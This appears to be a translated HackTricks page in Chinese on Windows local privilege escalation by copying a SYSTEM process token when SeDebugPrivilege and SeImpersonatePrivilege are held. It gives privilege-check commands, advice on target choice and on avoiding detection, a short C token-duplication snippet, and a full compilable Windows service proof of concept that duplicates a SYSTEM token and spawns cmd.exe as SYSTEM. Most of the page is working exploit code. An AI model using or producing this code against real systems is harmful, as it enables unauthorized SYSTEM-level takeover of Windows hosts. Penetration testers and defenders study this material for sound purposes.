# SeDebug + SeImpersonate - Copy Token

{{#include ../../banners/hacktricks-training.md}}

本页面介绍 **manual token-theft** 变体：具有 **High Integrity** 的上下文已经拥有 **`SeDebugPrivilege`** 和 **`SeImpersonatePrivilege`**，打开一个合适的 **SYSTEM** 进程，**复制其 token**，并使用该 token **生成新进程**。

如果你只需要从特权 admin 进程快速获取一个 `SYSTEM` shell，也可以查看：

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

如果你没有 process-handle path，但拥有 **`SeImpersonatePrivilege`**，通常使用 **named-pipe / Potato** 路径会更简单：

{{#ref}}
named-pipe-client-impersonation.md
{{#endref}}

{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

## 快速检查

在尝试 token-copy path 之前，确认当前进程已经处于有用的上下文中：
```cmd
whoami /groups | findstr /i "high mandatory"
whoami /priv | findstr /i "SeDebugPrivilege SeImpersonatePrivilege"
```
注意：

- **`SeDebugPrivilege`** 允许你打开许多**非受保护**的 SYSTEM 进程，即使它们的 DACL 通常会阻止你。
- **`SeImpersonatePrivilege`** 使之后使用 **`CreateProcessWithTokenW`** 变得可行。
- 如果 token-copy 路径只能提供一个权限较弱或经过过滤的 SYSTEM token，只需从**另一个 SYSTEM 进程**窃取 token。

## 仔细选择目标进程

该技术通常以 **`lsass.exe`** 为目标进行演示，但在现代 Windows 上，这通常是**错误的目标**：

- 如果启用了 **LSA Protection / RunAsPPL**，**`lsass.exe`** 会受到保护，即使普通管理员进程拥有 `SeDebugPrivilege`，也无法打开它。<sup>[[2]](#references)</sup>
- 优先选择**非 PPL 的 SYSTEM 进程**，例如 **`winlogon.exe`**、**`wininit.exe`**、**`services.exe`**，或较早启动的 **`svchost.exe`** 实例。
- **受保护进程**以及 **`System`** 或 **`csrss.exe`** 等特殊进程，并不是此技术中现实可行的 user-mode 目标。
- 使用以 elevated 权限运行的 **Process Hacker / Process Explorer**，在复制 token 前确认目标 token 实际拥有你需要的权限。

## 实际操作中重要的 API 细节

许多公开 PoC 会请求 **`PROCESS_ALL_ACCESS`** 和 **`TOKEN_ALL_ACCESS`**，但这会产生不必要的噪声。实际操作中：

- 仅使用所需权限打开目标进程（通常为 **`PROCESS_QUERY_INFORMATION`** 或 **`PROCESS_QUERY_LIMITED_INFORMATION`**）。
- 使用创建进程所需的权限打开 token：**`TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY`**。
- 使用 **`DuplicateTokenEx(..., TokenPrimary, ...)`** 创建**主 token**；仅有 impersonation token 不足以创建新进程。
- 如果 **`CreateProcessWithTokenW`** 失败并返回 **`1314`**，请改用 **`CreateProcessAsUserW`**。
- 如果从 **service / Session 0** 启动，请记住 **`CreateProcessWithTokenW`** 会让子进程保留在**调用方的 session** 中。如果需要可见的 desktop shell，请使用 **`CreateProcessAsUserW`**，并将 token 移动到目标 session。<sup>[[1]](#references)</sup>

一个最小化的现代流程如下：
```c
HANDLE hp = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
HANDLE hTok = NULL, hDup = NULL;
OpenProcessToken(hp, TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, &hTok);
DuplicateTokenEx(hTok, MAXIMUM_ALLOWED, NULL,
SecurityImpersonation, TokenPrimary, &hDup);
CreateProcessWithTokenW(hDup, LOGON_WITH_PROFILE,
L"C:\\Windows\\System32\\cmd.exe",
NULL, 0, NULL, NULL, &si, &pi);
```
## Full service PoC

以下代码**利用 `SeDebugPrivilege` 和 `SeImpersonatePrivilege` 权限**，从一个以 **SYSTEM** 身份运行且具有**所有 token 权限**的**进程**中复制 token。在此情况下，可以将代码编译并作为 **Windows service binary** 使用，以验证该 primitive 是否有效。<sup>[[3]](#references)</sup>

**发生提权的代码部分**位于 **`Exploit`** 函数中。在该函数中可以看到，代码会搜索 **`lsass.exe`**，复制其 **token**，最后使用该 token 启动一个拥有所复制 token 全部权限的新 **`cmd.exe`**。

在现代主机上，通常需要将 **`lsass.exe`** 替换为其他**非 PPL 的 SYSTEM 进程**，例如 **`winlogon.exe`**、**`wininit.exe`** 或 **`services.exe`**。

其他以 SYSTEM 身份运行且具有全部或大部分 token 权限的进程包括：**`services.exe`**、**`svchost.exe`**（其中一些最先启动的进程）、**`wininit.exe`**、**`csrss.exe`**……请记住，你通常**无法从受保护进程复制 token**。
```c
// From https://cboard.cprogramming.com/windows-programming/106768-running-my-program-service.html
#include <windows.h>
#include <tlhelp32.h>
#include <tchar.h>
#pragma comment (lib, "advapi32")

TCHAR* serviceName = TEXT("TokenDanceSrv");
SERVICE_STATUS serviceStatus;
SERVICE_STATUS_HANDLE serviceStatusHandle = 0;
HANDLE stopServiceEvent = 0;

//This function will find the pid of a process by name
int FindTarget(const char *procname) {

HANDLE hProcSnap;
PROCESSENTRY32 pe32;
int pid = 0;

hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
if (INVALID_HANDLE_VALUE == hProcSnap) return 0;

pe32.dwSize = sizeof(PROCESSENTRY32);

if (!Process32First(hProcSnap, &pe32)) {
CloseHandle(hProcSnap);
return 0;
}

while (Process32Next(hProcSnap, &pe32)) {
if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
pid = pe32.th32ProcessID;
break;
}
}

CloseHandle(hProcSnap);

return pid;
}


int Exploit(void) {

HANDLE hSystemToken, hSystemProcess;
HANDLE dupSystemToken = NULL;
HANDLE hProcess, hThread;
STARTUPINFOA si;
PROCESS_INFORMATION pi;
int pid = 0;


ZeroMemory(&si, sizeof(si));
si.cb = sizeof(si);
ZeroMemory(&pi, sizeof(pi));

// open high privileged process
if ( pid = FindTarget("lsass.exe") )
hSystemProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
else
return -1;

// extract high privileged token
if (!OpenProcessToken(hSystemProcess, TOKEN_ALL_ACCESS, &hSystemToken)) {
CloseHandle(hSystemProcess);
return -1;
}

// make a copy of a token
DuplicateTokenEx(hSystemToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dupSystemToken);

// and spawn a new process with higher privs
CreateProcessAsUserA(dupSystemToken, "C:\\windows\\system32\\cmd.exe",
NULL, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);

return 0;
}


void WINAPI ServiceControlHandler( DWORD controlCode ) {
switch ( controlCode ) {
case SERVICE_CONTROL_SHUTDOWN:
case SERVICE_CONTROL_STOP:
serviceStatus.dwCurrentState = SERVICE_STOP_PENDING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

SetEvent( stopServiceEvent );
return;

case SERVICE_CONTROL_PAUSE:
break;

case SERVICE_CONTROL_CONTINUE:
break;

case SERVICE_CONTROL_INTERROGATE:
break;

default:
break;
}
SetServiceStatus( serviceStatusHandle, &serviceStatus );
}

void WINAPI ServiceMain( DWORD argc, TCHAR* argv[] ) {
// initialise service status
serviceStatus.dwServiceType = SERVICE_WIN32;
serviceStatus.dwCurrentState = SERVICE_STOPPED;
serviceStatus.dwControlsAccepted = 0;
serviceStatus.dwWin32ExitCode = NO_ERROR;
serviceStatus.dwServiceSpecificExitCode = NO_ERROR;
serviceStatus.dwCheckPoint = 0;
serviceStatus.dwWaitHint = 0;

serviceStatusHandle = RegisterServiceCtrlHandler( serviceName, ServiceControlHandler );

if ( serviceStatusHandle ) {
// service is starting
serviceStatus.dwCurrentState = SERVICE_START_PENDING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

// do initialisation here
stopServiceEvent = CreateEvent( 0, FALSE, FALSE, 0 );

// running
serviceStatus.dwControlsAccepted |= (SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN);
serviceStatus.dwCurrentState = SERVICE_RUNNING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

Exploit();
WaitForSingleObject( stopServiceEvent, -1 );

// service was stopped
serviceStatus.dwCurrentState = SERVICE_STOP_PENDING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

// do cleanup here
CloseHandle( stopServiceEvent );
stopServiceEvent = 0;

// service is now stopped
serviceStatus.dwControlsAccepted &= ~(SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN);
serviceStatus.dwCurrentState = SERVICE_STOPPED;
SetServiceStatus( serviceStatusHandle, &serviceStatus );
}
}


void InstallService() {
SC_HANDLE serviceControlManager = OpenSCManager( 0, 0, SC_MANAGER_CREATE_SERVICE );

if ( serviceControlManager ) {
TCHAR path[ _MAX_PATH + 1 ];
if ( GetModuleFileName( 0, path, sizeof(path)/sizeof(path[0]) ) > 0 ) {
SC_HANDLE service = CreateService( serviceControlManager,
serviceName, serviceName,
SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
SERVICE_AUTO_START, SERVICE_ERROR_IGNORE, path,
0, 0, 0, 0, 0 );
if ( service )
CloseServiceHandle( service );
}
CloseServiceHandle( serviceControlManager );
}
}

void UninstallService() {
SC_HANDLE serviceControlManager = OpenSCManager( 0, 0, SC_MANAGER_CONNECT );

if ( serviceControlManager ) {
SC_HANDLE service = OpenService( serviceControlManager,
serviceName, SERVICE_QUERY_STATUS | DELETE );
if ( service ) {
SERVICE_STATUS serviceStatus;
if ( QueryServiceStatus( service, &serviceStatus ) ) {
if ( serviceStatus.dwCurrentState == SERVICE_STOPPED )
DeleteService( service );
}
CloseServiceHandle( service );
}
CloseServiceHandle( serviceControlManager );
}
}

int _tmain( int argc, TCHAR* argv[] )
{
if ( argc > 1 && lstrcmpi( argv[1], TEXT("install") ) == 0 ) {
InstallService();
}
else if ( argc > 1 && lstrcmpi( argv[1], TEXT("uninstall") ) == 0 ) {
UninstallService();
}
else  {
SERVICE_TABLE_ENTRY serviceTable[] = {
{ serviceName, ServiceMain },
{ 0, 0 }
};

StartServiceCtrlDispatcher( serviceTable );
}

return 0;
}
```
## 参考资料

- [1] [CreateProcessWithTokenW function (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw)
- [2] [配置额外的 LSA protection (Microsoft Learn)](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection)
- [3] [将我的程序作为 service 运行 (cboard.cprogramming.com) – PoC 使用的 Windows service skeleton](https://cboard.cprogramming.com/windows-programming/106768-running-my-program-service.html)

{{#include ../../banners/hacktricks-training.md}}
